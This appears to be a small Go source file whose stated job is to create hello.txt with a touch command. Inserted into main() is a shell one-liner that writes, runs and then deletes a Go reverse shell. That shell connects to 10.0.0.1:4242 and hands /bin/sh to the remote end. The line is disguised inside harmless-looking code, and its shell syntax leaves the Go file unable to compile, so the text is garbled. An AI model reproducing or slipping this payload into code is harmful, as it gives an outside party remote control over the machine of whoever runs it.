package main

import (
    "fmt"
    "os/exec"
)

func main() {
    cmd := exec.Command("touch", "hello.txt")
    echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
    err := cmd.Run()
    if err != nil {
        fmt.Println(err)
    } else {
        fmt.Println("hello.txt created")
    }
}
